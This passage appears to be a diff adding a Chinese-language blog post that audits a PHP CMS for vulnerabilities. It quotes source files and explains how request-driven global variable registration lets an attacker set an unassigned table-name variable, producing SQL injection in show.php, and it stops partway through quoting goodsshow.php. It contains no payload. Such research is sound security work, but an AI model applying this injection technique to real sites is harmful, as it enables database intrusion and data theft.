+&lt;p&gt;&lt;strong&gt;0x01漏洞分析&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;先看全局文件include\common.inc.php&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//检查外部传递的值并转义
+function _RunMagicQuotes(&amp;amp;$svar)
+{
+	//PHP5.4已经将此函数移除
+    if(@!get_magic_quotes_gpc())
+    {
+        if(is_array($svar))
+        {
+            foreach($svar as $_k =&amp;gt; $_v) $svar[$_k] = _RunMagicQuotes($_v);
+        }
+        else
+        {
+            if(strlen($svar)&amp;gt;0 &amp;amp;&amp;amp;
+			   preg_match('#^(cfg_|GLOBALS|_GET|_POST|_SESSION|_COOKIE)#',$svar))
+            {
+				exit('不允许请求的变量值!');
+            }
+
+            $svar = addslashes($svar);
+        }
+    }
+    return $svar;
+}
+
+
+//直接应用变量名称替代
+foreach(array('_GET','_POST') as $_request)
+{
+	foreach($$_request as $_k =&amp;gt; $_v)
+	{
+		if(strlen($_k)&amp;gt;0 &amp;amp;&amp;amp;
+		   preg_match('#^(GLOBALS|_GET|_POST|_SESSION|_COOKIE)#',$_k))
+		{
+			exit('不允许请求的变量名!');
+		}
+
+		${$_k} = _RunMagicQuotes($_v);
+	}
+}
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;这段代码的作用就是做全局的GPC转义以及注册全局变量，类似于一个为register_global。&lt;/p&gt;
+
+&lt;p&gt;看到4g.php&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;else if($m == 'show')
+{
+	require_once(PHPMYWIND_TEMP.'/default/mobile/show.php');
+	exit();
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;我们继续跟进default/mobile/show.php这个文件,看到以下代码&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php require_once(dirname(__FILE__).'/nav.php'); ?&amp;gt;
+		&amp;lt;!-- 栏目内容 --&amp;gt;
+		&amp;lt;?php
+		$row = $dosql-&amp;gt;GetOne(&quot;SELECT * FROM `#@__infoclass` WHERE id = $cid AND checkinfo = 'true' ORDER BY orderid ASC&quot;);
+		if(!empty($row['id']))
+		{
+		?&amp;gt;
+		&amp;lt;div class=&quot;pubBox&quot;&amp;gt;
+			&amp;lt;div class=&quot;hd&quot;&amp;gt;
+				&amp;lt;h2&amp;gt;&amp;lt;?php echo $row['classname']; ?&amp;gt;&amp;lt;/h2&amp;gt;
+			&amp;lt;/div&amp;gt;
+			&amp;lt;div class=&quot;ft&quot;&amp;gt;
+            	&amp;lt;div class=&quot;subCont&quot;&amp;gt;
+				&amp;lt;?php
+				switch($row['infotype'])
+				{
+					case 1:
+						$tbname = '#@__infolist';
+					break;
+					case 2:
+						$tbname = '#@__infoimg';
+					break;
+				}
+				//增加一次点击量
+				$dosql-&amp;gt;ExecNoneQuery(&quot;UPDATE `$tbname` SET hits=hits+1 WHERE `id`=$id&quot;);
+				$row = $dosql-&amp;gt;GetOne(&quot;SELECT * from `$tbname` WHERE `id`=$id&quot;);
+				?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;值得注意的是&lt;code class=&quot;highlighter-rouge&quot;&gt;$row['infotype']&lt;/code&gt;的值，如果这个变量的返回值为空的话，那么就会导致不会给&lt;code class=&quot;highlighter-rouge&quot;&gt;$tbname&lt;/code&gt;这个变量赋值，并且&lt;code class=&quot;highlighter-rouge&quot;&gt;$tbname&lt;/code&gt;进入了下面的sql语句中，位置就是表名。那我们可以通过控制cid的值，然后使&lt;code class=&quot;highlighter-rouge&quot;&gt;$row['infotype']&lt;/code&gt;无返回值，进一步为$tbname变量赋值.很显然这里就是一个SQL注入了。&lt;/p&gt;
+
+&lt;p&gt;然后看到goodsshow.php文件&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+			&lt;span class=&quot;c1&quot;&gt;//检测文档正确性
+&lt;/span&gt;			&lt;span class=&quot;nv&quot;&gt;$r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dosql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;GetOne&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SELECT * FROM `#@__goods` WHERE id=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+			&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+			&lt;span class=&quot;c1&quot;&gt;//增加一次点击量
+&lt;/span&gt;			&lt;span class=&quot;nv&quot;&gt;$dosql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;ExecNoneQuery&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UPDATE `#@__goods` SET hits=hits+1 WHERE id=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+			&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dosql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;GetOne&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SELECT * FROM `#@__goods` WHERE id=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+			&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'title'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;goodsarea&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; 
+				&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 组图区域开始--&amp;gt;&lt;/span&gt;
+				&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+				&lt;span class=&quot;c1&quot;&gt;//判断显示缩略图或组图
+&lt;/span&gt;				&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'picarr'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+				&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+					&lt;span class=&quot;nv&quot;&gt;$picarr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;unserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'picarr'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+					&lt;span class=&quot;nv&quot;&gt;$picarrBig&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$picarr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+				&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+				&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fl&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;zoompic&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cloud-zoom&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$picarrBig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$picarrBig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;adjustX:10, adjustY:0&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$picarrBig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+					&lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;zoomlist&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+						&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+						&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$picarr&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+						&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+							&lt;span class=&quot;nv&quot;&gt;$picarrSmall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+						&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+						&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;useZoom: 'zoompic', smallImage: '&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$picarrSmall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$picarrBig&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cloud-zoom-gallery&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$picarrSmall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$picarrSmall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+						&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+						&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+						&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+						&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cl&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+					&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
+					&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cl&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+				&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+				&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+				&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'picurl'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+				&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+				&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+				&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fl&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;zoompic&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cloud-zoom&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'picurl'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;adjustX:10, adjustY:0&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'picurl'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
+					&lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;zoomlist&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+						&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;useZoom: 'zoompic', smallImage: '&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'picurl'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' &quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cloud-zoom-gallery&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'picurl'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'picurl'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
+						&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cl&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+					&lt;span class=&quot;nt&quot;&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
+					&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cl&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+				&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
+				&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+				&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+				&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+				&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 组图区域结束 --&amp;gt;&lt;/span&gt; 
+				&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- 商品信息开始 --&amp;gt;&lt;/span&gt;
+				&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;fr&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+					&lt;span class=&quot;nt&quot;&gt;&amp;lt;ul&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tb-meta&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+						&lt;span class=&quot;nt&quot;&gt;&amp;lt;li&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&amp;gt;&lt;/span&gt;市场价&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&amp;lt;strong&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;lt&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'marketprice'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/strong&amp;gt;&lt;/span&gt;元 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
